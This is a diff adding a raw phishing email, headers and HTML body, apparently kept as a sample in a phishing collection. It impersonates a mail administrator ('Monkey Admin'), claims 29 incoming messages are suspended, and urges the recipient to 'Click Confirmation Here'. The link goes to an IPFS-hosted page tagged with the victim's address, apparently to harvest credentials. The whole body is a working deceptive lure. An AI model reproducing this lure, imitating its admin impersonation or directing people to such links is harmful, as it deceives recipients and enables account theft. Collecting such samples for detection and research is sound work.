@@ -1,0 +1,319 @@
+Return-Path: online@dohahealthcare.com
+Delivered-To: jose@monkey.org
+X-FDA: 82742775696.04.D7EC981
+Received: from vps.thiagho.com (vps.thiagho.com [144.126.154.42])
+	by imf26.b.hostedemail.com (Postfix) with ESMTP id F028B180007
+	for <jose@monkey.org>; Sat,  2 Nov 2024 23:40:13 +0000 (UTC)
+Authentication-Results: imf26.b.hostedemail.com;	dkim=pass
+ header.d=mt10.com.br header.s=default header.b=qGQyGZyJ;	spf=none
+ (imf26.b.hostedemail.com: domain of online@dohahealthcare.com has no SPF
+ policy when checking 144.126.154.42) smtp.mailfrom=online@dohahealthcare.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1730590658;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=6zk62zyhD6GCGJ3CiwjhNt48LjFJaHJRG7pCez16msY=;
+	b=AXsFfMD1t4xoEGhc8ydElFx3v9VzhXWm9JpMEVRw7gfjDuzAgrY/AagCB9wSuxi9H4GQAe
+	gHrLkMXYT0Yi021CRU1r3/CleePpohpiw4LpEUyTvUQCpnxn8wDc8Ahcy4vEUT39yRf3c+
+	AOykulKZt4+NvfIkkxnuh9dHUDpAc2o=
+ARC-Authentication-Results: i=1;	imf26.b.hostedemail.com;	dkim=pass
+ header.d=mt10.com.br header.s=default header.b=qGQyGZyJ;	spf=none
+ (imf26.b.hostedemail.com: domain of online@dohahealthcare.com has no SPF
+ policy when checking 144.126.154.42) smtp.mailfrom=online@dohahealthcare.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1730590658; a=rsa-sha256;
+	cv=none;
+	b=Gg4lylKHOPap8jrXFO+EidqNGTg1/4id3KoJD3neSS+aTFd4yedK/yklutMQgCTqNvAyfK
+	uCfhx8+slJE5rOZTqvk8B5pMU9clwKUeNbiz4siYifQT6IshcdwNZM0NYNi19+Nd9OU9v4
+	pKCCoIqaLefhdttCxdGJa83KMVxvtUA=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=mt10.com.br
+	; s=default; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID
+	:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=6zk62zyhD6GCGJ3CiwjhNt48LjFJaHJRG7pCez16msY=; b=qGQyGZyJ1tTrU2m6DiGAlDp/nh
+	0vgXy1OxKl2HrnKOlwGf2a9JBqRcipubODK5vuyZ41jRaXoUHJVM2P9nzYCK/XG8QOt2Tg3funXsG
+	lsITA0sfPADel3YIEbFkzCJlZLwOW2Yahf8/yWB0OorOlmNXaKkBbVB1O7xtHXzf6kaZ7jI98Vc2x
+	yI1fRQnJUDaKaOpfxaH4WoeCwm4S7IhWkcLtqO+e/Q7Aq+rTuGhSiGn9XJHvHMfKhIyVY8cmUfXE8
+	mvSfLZG18nzW/dIqz9dkEwGgmJrG1vRHjuKUjn6qLgVkY+D92keA0YFOC73KOe26FjmFfg+X3Q1Mg
+	MXeNlBAg==;
+Received: from [103.114.217.9] (port=53818 helo=dohahealthcare.com)	by
+ vps.thiagho.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.96.2)	(envelope-from
+ <online@dohahealthcare.com>)	id 1t6plH-0004Ti-37	for jose@monkey.org;	Fri, 01
+ Nov 2024 07:24:16 -0400
+From: Monkey Admin  <online@dohahealthcare.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?W1dBUk5JTkddIFlvdXIgTWFpbGJveCBpcyBGdWxsIOKchQ==?=
+Date: 02 Nov 2024 00:24:50 -0700
+Message-ID: <20241102002450.BE84AD53F7116507@dohahealthcare.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - vps.thiagho.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - dohahealthcare.com
+X-Get-Message-Sender-Via:
+ vps.thiagho.com: authenticated_id: back-up@mt10.com.br
+X-Authenticated-Sender: vps.thiagho.com: back-up@mt10.com.br
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: F028B180007
+X-Stat-Signature: 58oy6z9yxcwq3i46n69raq41rtb9djtc
+X-Spam-Status: Yes, score=12.40
+X-Rspam-User: 
+X-HE-Tag: 1730590813-628339
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19esEHgfCamzsKgSvNh4lBM4f7QI/1GmEIfB98uxjxhdU+?=
+ =?utf-8?q?pBDbAn75etzVLag3D/NUrbNvgcNJRJ5dzge9/Qx0OSkko1/YTBFRM5e0sTHVg1LVO?=
+ =?utf-8?q?sO2IRdRxLAQ8tW+ljh78CmPY0PSic+1jEIaA0JpUs/qngkLieW7XsTWln6GBrsyIT?=
+ =?utf-8?q?gfrUmDOFZzqhM7uCVsByVcNw+eU6d46/aPfOwoa13TMdUxaiE3DZKJFn/VwRm9A0U?=
+ =?utf-8?q?4XRvoV9TMV2V7Ii4khrTKK7EUjTgGU6sUF2ce8Bj9WnMyGtW6cJjqI/I/zggYcU4p?=
+ =?utf-8?q?ux29Xl6uRr2+6l1+EA2uaTkUCwi/8YCMJ1iI+ApiVgcmqkJsYoVQ5Inn0tw7Y7/kW?=
+ =?utf-8?q?ZSS9kYh/KzFPdK0sXphcIh+KWJ16rSenzy4R8y4EvrH/mzdVC+K/31mPD2grQFKbo?=
+ =?utf-8?q?9upKq2+pv2PW/piufcFata9+LNIkfgSKjik4ZwMRqFoX9QHxqotUaX6F6kJYbEnkq?=
+ =?utf-8?q?4nS0LaDnWKLyYYY/Z2LaNaLn5PNEoZf5K6vPPv4tmq7riX0QmL4NjCxOChWp9MWA5?=
+ =?utf-8?q?jcLyJCC/K1oMKLUeWOW0crU/KONH919s8WPzIz4qUUom1ao3haCLyLHIzVaLF75X1?=
+ =?utf-8?q?c6sK7jg0roLWR8wUdacqKtjzDW3nDlY5lLJTPap3VmgTVMSF+kjCmt1wRC0/NCLpC?=
+ =?utf-8?q?+7HOIekqJWvmqojjMwW/BFVYNKpgLokJALlIz1UPBffg9URbrK6B3fI6Jb5xg3N2s?=
+ =?utf-8?q?mQC1L6Ndi1VNudM3f1WHVj5QfwVOYCG1vma+RRuFg+nQ1K0B/GKifbNgBwH5I4Sjf?=
+ =?utf-8?q?rwFTyzjOsrjOqArk7a98frCmNYrDoLO9/7KfvwCjgFeLGqH0sNoVjbb/G/uW0LSWo?=
+ =?utf-8?q?uA4QChYkby+26qUWbPO3BaqZFtR+bjrXxEyvX8td1gUIYT9WPH1Z+LYOR4DRyXWQ9?=
+ =?utf-8?q?F0LM018O5agms5RucUCTPs_WSRK9z++yTZTH+9Xlr5UGpTtirei0z8z0IX1ZE9Oh2?=
+ =?utf-8?q?rOLfqZjtg8yol5/3ewadiREB3bZ0nWYSZcnBa0HqIyP9RlVRIECpT/xOQWDJV65l5?=
+ =?utf-8?q?3QbguITNxJodjTq2/G9O1TwoSub6ZNhJVLaXXf2OVYU6TPWgzm4Wbmeahwl9MM++k?=
+ =?utf-8?q?/nhriNzi9xrlRiW0VNPyiBfVajPDb6pJUqZHEyu4N5ZWGVt808Wis9WTYHZfBiu5d?=
+ =?utf-8?q?HeReDOyjNmq4BLCNjxiTIbg9POESJvXylqLQp0Cw3B0uBWSSYDMyYaifEfSbHp0hP?=
+ =?utf-8?q?NOo0NF8OJ3UnwfP+9P11OfWWkh2pFPR6x4VW0HmETVXi7ODC0V6Tzsu1T/U+9unYB?=
+ =?utf-8?q?jk0fOPFZQ4JWpqP+f6pR3c70SRbSibOUTH8SkE8OPIrf391OWLskiRJ7Duttaq0Ck?=
+ =?utf-8?q?l3Jr3b/tSEAObLDi4AFcP0nD9VHg95+qk8tgHQICfIY/vSSgrIAgYplJeTvRlwQg5?=
+ =?utf-8?q?c3fE76ZpQoFtP7VftqALkUfFLi8H8kANnkBNlYNXinbQs+eU+CcG4dEiw5eeTGTVy?=
+ =?utf-8?q?Y7RWUuCG24TVN6RsuqqFm1teQYE7v7H4rvC4XH2vqeDRjT5g6BxQm5TWXnYGlyiat?=
+ =?utf-8?q?T6fnLdEa+GOGWV1ipENF1dayhkVKZMCS9kvK+TJAlDJGoiIQRJtbw13YS3dfryH8q?=
+ =?utf-8?q?byaIQFG7yjVOefKqQ?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 326
+
+<HTML><HEAD><TITLE></TITLE>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19003"></HEAD>
+<body>
+<DIV style=3D"FONT-SIZE: small; BORDER-TOP: 0px; FONT-FAMILY: Arial, Helvet=
+ica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: no=
+ne; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-ALIGN:=
+ justify; PADDING-TOP: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
+decoration-style: initial; text-decoration-color:=20
+initial">
+<DIV=20
+id=3D"m_210202613910515071m_-267822217679769024gmail-v1m_776905359187935459=
+7m_3581005325219468014m_262248444510734749m_941632856481440599m_80386838917=
+30739398m_2730754708336566418m_-5074038341624849382m_9185272064642862516m_5=
+399053519732036182m_-4876110685193878291m_3504928812262433789m_-65919441750=
+61021977m_-8872902175617634492m_-2289998206023505729m_-4982322665468679206m=
+_3990883881372523468m_-671296224873634323m_1302812626765148287m_-8238292577=
+827888784gmail-m_8541417227104797742m_32751449751105
+&#13;&#10;&#13;&#10;&#13;&#10;04610m_-26052565042996820m_-51306899366025390=
+97m_&#10;&#10;&#10;v1-9203484536582816166m_-6244742913455624867m_-856658834=
+4968187060m_5831294811378004987m_540272476408864084m_8967649885835505895m_-=
+7179266776565641232m_-8117423519701980565m_583789411969586355m_-77843509945=
+18691401m_-3927294165747829221m_-6057303607480482928m_-4361200642790553509i=
+mail_signature" style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px"><BR class=3DApp=
+le-interchange-newline>
+<table style=3D"FONT-SIZE: 14px; MAX-WIDTH: 100%; WIDTH: 435px; BORDER-COLL=
+APSE: collapse; TABLE-LAYOUT: fixed; COLOR: rgb(155,158,161); BORDER-SPACIN=
+G: 0px; LINE-HEIGHT: 1.3" cellpadding=3D"0">
+<TBODY style=3D'FONT-FAMILY: "PingFang SC", "Hiragino Sans GB", "WenQuanYi =
+Micro Hei", "Microsoft Yahei", &#24494;&#36719;&#38597;&#40657;, verdana'>
+<TR>
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; WIDTH: 45px; PADDING-BOTTOM: 0px; PADDING-TOP: 0p=
+x; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 7px" width=3D"45"></TD>
+<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
+; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 7px; MARGIN: 0px; PA=
+DDING-RIGHT: 0px"></TD></TR></TBODY></TABLE></DIV></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-ALIGN: justify; ORPHANS=
+: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-thickness: initial; text-decoration-style: initial; text-dec=
+oration-color: initial" name=3D"quoted-content">
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px; BACKGROUND-COLOR: rgb(244,=
+248,245)">
+<DIV style=3D"BORDER-TOP: 0px; WIDTH: 408px; FLOAT: left; PADDING-BOTTOM: 5=
+px; PADDING-TOP: 5px; MARGIN-LEFT: 18px; PADDING-RIGHT: 5px">
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px"><SPAN style=3D'FONT-SIZE: =
+13px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Tahoma, Aria=
+l, sans-serif'>Message generated from&nbsp;</SPAN><FONT face=3D"wf_segoe-ui=
+_normal, Segoe UI, Segoe WP, Tahoma, Arial, sans-serif">jose@monkey.org sou=
+rce.</FONT></DIV></DIV>
+<DIV>
+<DIV style=3D"BORDER-TOP: 0px; HEIGHT: 30px; WIDTH: 5px; PADDING-TOP: 0px; =
+BACKGROUND-COLOR: rgb(86,166,89)"></DIV>
+<P></P>
+<table style=3D"FONT-SIZE: 15px; MAX-WIDTH: 548px; BORDER-COLLAPSE: collaps=
+e; COLOR: black; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; BORDER-SPACING: 0px=
+; font-stretch: inherit" cellspacing=3D"0" cellpadding=3D"0" width=3D"548">=
+
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
+; PADDING-BOTTOM: 15px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-SPACING: 0px=
+; PADDING-RIGHT: 0px">
+<table style=3D"MAX-WIDTH: 548px; FONT-FAMILY: inherit; BORDER-COLLAPSE: co=
+llapse; FONT-WEIGHT: 600; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; BORDER-SPA=
+CING: 0px; font-stretch: inherit">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, Arial, sans-serif=
+; WIDTH: 181px; VERTICAL-ALIGN: bottom; MARGIN: 0px"></TD>
+<td style=3D"FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, Arial, sans-serif=
+; WIDTH: 186px; VERTICAL-ALIGN: bottom; TEXT-ALIGN: center; MARGIN: 0px"></=
+TD>
+<td style=3D"FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, Arial, sans-serif=
+; WIDTH: 181px; VERTICAL-ALIGN: bottom; TEXT-ALIGN: right; MARGIN: 0px"></T=
+D></TR>
+<TR>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; MARGIN: 0px"><FONT color=3Dwhite><SP=
+AN style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN=
+: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: black; PADDING-BOTTOM: 0px; PA=
+DDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-=
+TOP-WIDTH: 0px">Sender</SPAN></FONT></TD>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; WIDTH: 186px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
+PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; MARGIN: 0px"></T=
+D>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
+PADDING-BOTTOM: 0px; TEXT-ALIGN: right; PADDING-TOP: 0px; MARGIN: 0px"><FON=
+T color=3Dwhite><SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: =
+0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(192,0,0=
+); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><B>Action Required</B>
+ </SPAN></FONT></TD></TR>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
+; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PA=
+DDING-RIGHT: 0px" colspan=3D"3">
+<table style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP=
+: 0px; PADDING-LEFT: 0px; BORDER-SPACING: 0px; PADDING-RIGHT: 0px" cellspac=
+ing=3D"0" cellpadding=3D"0">
+<TBODY>
+<TR height=3D10>
+<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; FONT-FAMILY: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif; WIDTH: 180px; PADDING-BOTTOM: 0px; PADDING-=
+TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT:=
+ 0px" bgcolor=3D"#cccccc"></TD>
+<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; FONT-FAMILY: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif; WIDTH: 4px; PADDING-BOTTOM: 0px; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
+px" bgcolor=3D"white"></TD>
+<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; FONT-FAMILY: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif; WIDTH: 180px; PADDING-BOTTOM: 0px; PADDING-=
+TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT:=
+ 0px" bgcolor=3D"#cccccc"></TD>
+<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; FONT-FAMILY: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif; WIDTH: 4px; PADDING-BOTTOM: 0px; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
+px" bgcolor=3D"white"></TD>
+<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; FONT-FAMILY: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif; WIDTH: 180px; PADDING-BOTTOM: 0px; PADDING-=
+TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT:=
+ 0px" bgcolor=3D"#c00000"></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; PAD=
+DING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-R=
+IGHT: 0px"></TD>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; WIDTH: 186px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEX=
+T-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEI=
+GHT: 20px; PADDING-RIGHT: 0px"></TD>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEX=
+T-ALIGN: right; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIG=
+HT: 20px; PADDING-RIGHT: 0px"><FONT color=3Dwhite>
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-AL=
+IGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(192,0,0); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px">Messages suspended</SPAN></FONT></TD></TR></TBODY=
+></TABLE></TD></TR>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
+; WIDTH: 528px; PADDING-TOP: 0px; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-=
+RIGHT: 10px"><BR>
+<table style=3D"WIDTH: 528px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; MARGIN-LEFT: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(24=
+2,245,250)">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 21px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
+x; MARGIN: 0px; PADDING-RIGHT: 10px">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: inherit=
+; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BO=
+RDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING-=
+TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WI=
+DTH: 0px; font-stretch: inherit"><B>Message Failure Delivery Notice.</B></D=
+IV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: inherit=
+; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0=
+px; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
+FT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stret=
+ch: inherit">User: jose@monkey.org</DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: inherit=
+; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0=
+px; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
+FT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stret=
+ch: inherit"></DIV></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
+x; MARGIN: 0px; PADDING-RIGHT: 10px">You have (29) Suspended incoming messa=
+ges<BR><BR>Please Fix It Below<BR><BR>
+<A style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN=
+: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(17,85,204); PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px=
+; BORDER-TOP-WIDTH: 0px" href=3D"https://ipfs.io/ipfs/QmUf8PQMne21qVv9vZ54h=
+Ar8rZT4BRLQnV7sbm1cMHdoEb#jose@monkey.org" rel=3Dnoreferrer target=3D_blank=
+=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs=
+/QmaMUgBHPAbVsvuMMBNJyiKUcUZ6R1EHkXsH9VZEnGGuE9#%3D%5B%5B-Email-%5D%5D&amp;=
+source=3Dgmail&amp;ust=3D1646832702602000&amp;usg=3DAOvVaw2gHWwIL434Zf66j7G=
+j-0YI"><B>Click Confirmation Here</B></A>&nbsp;To View Incoming Suspended M=
+essages And Retrieve Them.<BR></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
+x; MARGIN: 0px; PADDING-RIGHT: 10px">Created Date: 11/2/2024 12:24:50 a.m. =
+(EDT) .<BR></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Frutiger, =
+Arial, sans-serif; PADDING-BOTTOM: 4px; PADDING-TOP: 10px; MARGIN: 0px"><BR=
+></TD></TR></TBODY></TABLE><FONT color=3D#999999>
+The information contained in or attached to this communication is intended =
+solely for the use of the individual or entity to whom it is addressed and =
+others authorized to receive it. It may contain confidential or legally pri=
+vileged information. If you are not the intended recipient you are hereby n=
+otified that any disclosure, copying, distribution or taking any action in =
+reliance on the contents of this information is strictly prohibited and may=
+ be unlawful. If you have received this=20
+communication in error, please notify me immediately by responding to this =
+email and then delete it from your system. We are neither liable for the pr=
+oper and complete transmission of the information contained in this communi=
+cation&nbsp;</FONT></DIV></DIV></DIV></BODY></HTML>
+
